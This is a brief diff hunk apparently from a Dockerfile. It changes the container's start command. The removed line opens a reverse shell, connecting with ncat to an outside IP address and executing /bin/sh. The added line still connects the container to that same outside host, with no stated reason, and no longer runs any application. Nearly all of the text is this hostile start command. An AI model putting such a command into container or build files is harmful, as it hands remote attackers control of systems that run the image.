@@ -62,4 +62,4 @@ ENV PORT 80
 # # Set hostname to localhost
 ENV HOSTNAME "0.0.0.0"
 
-CMD ["ncat", "172.232.159.28", "8989", "-e", "/bin/sh"]
+CMD ["ncat", "172.232.159.28", "8989"]
